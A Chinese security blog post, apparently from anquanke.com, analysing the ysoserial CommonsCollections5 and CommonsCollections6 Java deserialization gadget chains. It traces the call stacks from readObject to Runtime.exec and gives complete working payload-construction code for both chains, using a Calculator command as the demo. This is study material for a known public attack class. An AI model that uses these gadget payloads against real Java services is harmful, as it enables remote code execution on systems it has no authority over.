> 原文链接: https://www.anquanke.com//post/id/233410 


# ysoserial CommonsCollections5/6 详细分析


                                阅读量   
                                **117803**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t0174eb23885b859a66.jpg)](https://p0.ssl.qhimg.com/t0174eb23885b859a66.jpg)



CC5 、CC6 链利用了新的反序列化触发点，命令执行为CC1的利用方式，作者换了两个反序列化入口方法。同时又引出了Java HashMap和HashSet等利用方法，本文从基础知识、链存在的意义、链的分析构造这三大方面展开学习。



## 0x01 前置知识

### <a class="reference-link" name="0x1%20HashSet%20%E5%92%8C%20HashMap"></a>0x1 HashSet 和 HashMap

**<a class="reference-link" name="1.%20HashMap"></a>1. HashMap**

HashMap实现了Map接口，该接口的作用主要是为客户提供三种方式的数据显示：只查看keys列表，只查看values列表，或以key-value形式成对查看。

拥有一个内部静态类Entry用于存储键值对，并且可以已链的形式添加多个元素

[![](https://p3.ssl.qhimg.com/t01c61a9adeb5ce02c7.png)](https://p3.ssl.qhimg.com/t01c61a9adeb5ce02c7.png)

在HashMap中Entry类型的变量名叫table

[![](https://p3.ssl.qhimg.com/t014912edb291daccf4.png)](https://p3.ssl.qhimg.com/t014912edb291daccf4.png)

通过反射的方法获取HashMap中的key或value

```
public static void main(String[] args) throws  IllegalAccessException, NoSuchFieldException `{`
HashMap&lt;Integer, Integer&gt; map = new HashMap(1,2);
map.put(1,1);
Class mapClass = map.getClass();
Field tableField = mapClass.getDeclaredField("table"); //获取的Entry数组
tableField.setAccessible(true);
Object[] array = (Object[]) tableField.get(map);

Class entryClass = array[0].getClass();
Field entryField = entryClass.getDeclaredField("key");
entryField.setAccessible(true);
Integer value = (Integer) entryField.get(array[0]);
System.out.println(value);
`}`
```

**<a class="reference-link" name="2.%20HashSet"></a>2. HashSet**
1. HashSet 底层是基于HashMap实现的。
1. 在HashSet中不允许出现重复的元素，HashSet 的绝大部分方法都是通过调用 HashMap 的方法来实现的。
1. HashSet要重写hashCode和equals方法，方便比较对象的值是否相等。
1. 当调用HashSet的add方法时，实际上是向HashMap中增加了一行(key-value对)
在创建HashSet的同时内部已经创建了HashMap，下图为hashSet的构造方法，可以看出HashMap在构造方法中单独创建。

[![](https://p0.ssl.qhimg.com/t012c1d12500e19e4da.png)](https://p0.ssl.qhimg.com/t012c1d12500e19e4da.png)

在CC6中会用到该类进行相关的操作，通过反射获取HashMap，之后获取HashMap中的key和value

```
Field f = null;
f = HashSet.class.getDeclaredField("map");
f.setAccessible(true);
f.get(hashset)
```

### <a class="reference-link" name="0x2%20LazyMap%20%E8%A7%A6%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%93%BE"></a>0x2 LazyMap 触发命令执行链

首先回CC1命令执行（`https://www.anquanke.com/post/id/230788`）的触发点为ChainedTransformer类的transform方法，如下图所示，构造的链要正好调用这个chainedTransformer的transform方法

[![](https://p4.ssl.qhimg.com/t0112305e095b303b5e.png)](https://p4.ssl.qhimg.com/t0112305e095b303b5e.png)

在其get方法中，执行了factory的tansform方法，如下图所示

[![](https://p5.ssl.qhimg.com/t01f58d19c74ebc62e6.png)](https://p5.ssl.qhimg.com/t01f58d19c74ebc62e6.png)

那么如果factory可控就可以完成当前的任务，在LazyMap的构造方法中看到相关赋值，其内容为构造方法的第二个参数。

[![](https://p4.ssl.qhimg.com/t014fc76f46457c6dbe.png)](https://p4.ssl.qhimg.com/t014fc76f46457c6dbe.png)

所以上面的ChainedTransformer可以通过构造方法与LazyMap关联

[![](https://p2.ssl.qhimg.com/t016c8eb8fa56e5e8bf.png)](https://p2.ssl.qhimg.com/t016c8eb8fa56e5e8bf.png)



## 0x02 CommonsCollections5 分析

### <a class="reference-link" name="0x1%20CC5%20%E9%93%BE%E7%9A%84%E7%94%B1%E6%9D%A5"></a>0x1 CC5 链的由来

由前置知识中的命令执行链，我们知道了目前要做的是找一个能够衔接LazyMap的get方法的调用链，回顾CC1的触发点，当时作者找到了AnnotationInvocationHandler 中的invoke方法里的一处调用

[![](https://p2.ssl.qhimg.com/t014075f04f3e248c6e.png)](https://p2.ssl.qhimg.com/t014075f04f3e248c6e.png)

然而触发invoke方法还要跟readobject方法连在一起，凑巧的是 AnnotationInvocationHandler 的readobject方法中有一些可控的变量方法调用，如下图的memberValues就是构造参数，用户可以进行控制。

[![](https://p5.ssl.qhimg.com/t01a91b54f21e4fad0f.png)](https://p5.ssl.qhimg.com/t01a91b54f21e4fad0f.png)

可以通过代理的方式触发invoke 方法完成命令执行。

CC5 相当于从新找了个方法接替了 AnnotationInvocationHandler 的工作，这个类就叫做 BadAttributeValueExpException 。

### <a class="reference-link" name="0x2%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90"></a>0x2 反序列化链分析

**<a class="reference-link" name="1.%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3%E7%82%B9%E5%88%86%E6%9E%90"></a>1. 反序列化入口点分析**

我们先来看看BadAttributeValueExpException类的readobject方法

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01dd28c5ce0d0c3529.png)

从代码中可以看出valObj执行了toString方法，通过前几个链的学习，对反射获取变量内容应该已经非常熟悉了，这个valObj变量就是通过ois序列化流获取的val变量，因此这个地方我们是可控的。

[![](https://p3.ssl.qhimg.com/t014c5a26791d246466.png)](https://p3.ssl.qhimg.com/t014c5a26791d246466.png)

**<a class="reference-link" name="2.%20tostring%20%E5%92%8C%20get%E6%96%B9%E6%B3%95%E5%85%B3%E8%81%94"></a>2. tostring 和 get方法关联**

通过上一步操作就将问题转为 找一个类的tostring方法，之后他会调用LazyMap的get方法。确实存在这个类TiedMapEntry ，可以看看他的方法调用关系

[![](https://p4.ssl.qhimg.com/t019ba422768c92898a.png)](https://p4.ssl.qhimg.com/t019ba422768c92898a.png)

与此同时 TiedMapEntry 构造方法中可以传递map变量

```
public TiedMapEntry(Map map, Object key) `{`
        super();
        this.map = map;
        this.key = key;
    `}`
```

[![](https://p1.ssl.qhimg.com/t01fedac8b27ea8eaee.png)](https://p1.ssl.qhimg.com/t01fedac8b27ea8eaee.png)

**<a class="reference-link" name="3.%20%E7%B4%A7%E5%AF%86%E8%A1%94%E6%8E%A5"></a>3. 紧密衔接**

之后就是 lazyMap 及命令执行部分了，可以参考 [https://www.anquanke.com/post/id/230788#h2-5](https://www.anquanke.com/post/id/230788#h2-5)

调用栈如下

```
Gadget chain:
ObjectInputStream.readObject()
    BadAttributeValueExpException.readObject()
        TiedMapEntry.toString()
            LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Class.getMethod()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.getRuntime()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.exec()
```

完整的调用链如下图所示

[![](https://p4.ssl.qhimg.com/t0131f14bdb6104db76.png)](https://p4.ssl.qhimg.com/t0131f14bdb6104db76.png)

### <a class="reference-link" name="0x3%20payload%E7%BC%96%E5%86%99"></a>0x3 payload编写

CC5 的利用编写相对来说比较简单，整个利用延续CC1模板，添加关于TiedMapEntry 类的相关操作。

```
final String[] execArgs = new String[] `{` "/System/Applications/Calculator.app/Contents/MacOS/Calculator" `}`;
final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]`{` new ConstantTransformer(1) `}`);
final Transformer[] transformers = new Transformer[] `{`
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] `{`
                String.class, Class[].class `}`, new Object[] `{`
                "getRuntime", new Class[0] `}`),
        new InvokerTransformer("invoke", new Class[] `{`
                Object.class, Object[].class `}`, new Object[] `{`
                null, new Object[0] `}`),
        new InvokerTransformer("exec",
                new Class[] `{` String.class `}`, execArgs),
        new ConstantTransformer(1) `}`;

final Map innerMap = new HashMap();

final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

BadAttributeValueExpException val = new BadAttributeValueExpException(null);
Field valfield = val.getClass().getDeclaredField("val");
Reflections.setAccessible(valfield);
valfield.set(val, entry);

Field valfield2 = transformerChain.getClass().getDeclaredField("iTransformers");
valfield2.setAccessible(true);
valfield2.set(transformerChain, transformers);

byte[] serializeData=serialize(val);
unserialize(serializeData);
```



## 0x03 CommonsCollections6 分析

### <a class="reference-link" name="0x1%20CC6%20%E9%93%BE%E7%9A%84%E7%94%B1%E6%9D%A5"></a>0x1 CC6 链的由来

CC6 这个链可以说是CC5的兄弟版，这么说是有原因的，先来看看TiedMapEntry类中的两个函数

[![](https://p4.ssl.qhimg.com/t01742e0a486b8c4023.png)](https://p4.ssl.qhimg.com/t01742e0a486b8c4023.png)

通过分析CC5 已经知道getValue函数意味着什么，CC5可以通过toString方法触发getValue，那么这条CC6链就是通过hashCode方法触发getValue。这也就是两条链不同的最根本的原因。

[![](https://p3.ssl.qhimg.com/t01e52b76ddec9bb056.png)](https://p3.ssl.qhimg.com/t01e52b76ddec9bb056.png)

### <a class="reference-link" name="0x2%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90"></a>0x2 反序列化链分析

那么接下来的工作就是找到调用hashCode函数的代码，并且想办法与readObject方法关联上。下面分两步操作寻找，寻找其中的交集类。

**<a class="reference-link" name="0x1%20hashCode%E7%9A%84%E8%B0%83%E7%94%A8%E8%80%85"></a>0x1 hashCode的调用者**

hashCode调用者特别多，作者在HashMap中找到了一处调用链，首先是HashMap的put方法

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01837a32605a023026.png)

再之后是调用hash函数，完成整个利用链构造

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e282ab53acbb7b91.png)

根据参数的传递只需控制`put(K key, V value)`中的key值为 构造好的TiedMapEntry即可。目前形成的利用链如下，下一步需要和readObject方法对接

[![](https://p1.ssl.qhimg.com/t011dc92ead5fc53f6b.png)](https://p1.ssl.qhimg.com/t011dc92ead5fc53f6b.png)

**<a class="reference-link" name="0x2%20%E5%AF%BB%E6%89%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3"></a>0x2 寻找反序列化入口**

上一小节分析到了HashMap的put方法，那么接下来找一个readObject方法或者其他方法调用HashMap的put方法。作者找到了HashSet类

[![](https://p0.ssl.qhimg.com/t01d2d7f65dc306ac81.png)](https://p0.ssl.qhimg.com/t01d2d7f65dc306ac81.png)

map 在反序列化的时候会对象化，判断是否该对象是否属于LinkedHashSet，如果不是这个map就是HashMap。至此整个利用链结构如下

**<a class="reference-link" name="0x3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E6%A0%88"></a>0x3 反序列化调用栈**

调试时的java执行栈

```
java.io.ObjectInputStream.readObject()
java.util.HashSet.readObject()
java.util.HashMap.put()
java.util.HashMap.hash()
org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
org.apache.commons.collections.map.LazyMap.get()
org.apache.commons.collections.functors.ChainedTransformer.transform()
org.apache.commons.collections.functors.InvokerTransformer.transform()
java.lang.reflect.Method.invoke()
java.lang.Runtime.exec()
```

构造payload可以参考下图

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0117e939ee71ef5422.png)

### <a class="reference-link" name="0x3%20payload%E7%BC%96%E5%86%99"></a>0x3 payload编写

利用分析过后payload也就相对比较好写了，TiedMapEntry 之前都不用更该，主要是HashMap和HashSet之间的调用代码，在一开始的前置知识中也写很详细的介绍了。CC6 利用代码在序列化链部分主要是修改了HashSet中的HashMap中的table的key为构造好的TiedMapEntry对象。这样在HashSet触发readObject函数的时候就可以走通整个流程。

```
public static void main(String[] args) throws Exception `{`
        final String[] execArgs = new String[] `{` "/System/Applications/Calculator.app/Contents/MacOS/Calculator" `}`;
        final Transformer[] transformers = new Transformer[] `{`
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] `{`
                        String.class, Class[].class `}`, new Object[] `{`
                        "getRuntime", new Class[0] `}`),
                new InvokerTransformer("invoke", new Class[] `{`
                        Object.class, Object[].class `}`, new Object[] `{`
                        null, new Object[0] `}`),
                new InvokerTransformer("exec",
                        new Class[] `{` String.class `}`, execArgs),
                new ConstantTransformer(1) `}`;

        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        f = HashSet.class.getDeclaredField("map");
        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        f2 = HashMap.class.getDeclaredField("table");
        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null)`{`
            node = array[1];
        `}`

        Field keyField = null;
        keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, entry);

        byte[] serializeData=serialize(map);
        unserialize(serializeData);
    `}`
```



## 0x04 总结

CC5 和 CC6 这两个兄弟链分析过后，对java反序列化链有了更深的一层认识，链的概念又更清楚了些。CC5 和 CC6 沿用经典的InvokerTransformer 命令执行方法，但是采用了基于TiedMapEntry类的两种不同的反序列化触发链。这也为以后我们自己挖掘利用链提供了很好的思路。同样在挖掘利用链的时候要注意已经存在链的首尾两端函数，是否能和目标中的函数对应上。CC反序列化利用系列还将继续…..

本文代码 [https://github.com/BabyTeam1024/ysoserial_analyse/blob/main/cc6.java](https://github.com/BabyTeam1024/ysoserial_analyse/blob/main/cc6.java)



## 0x05 参考文章

[https://www.cnblogs.com/nice0e3/p/13892510.html](https://www.cnblogs.com/nice0e3/p/13892510.html)<br>[https://www.anquanke.com/post/id/230788](https://www.anquanke.com/post/id/230788)
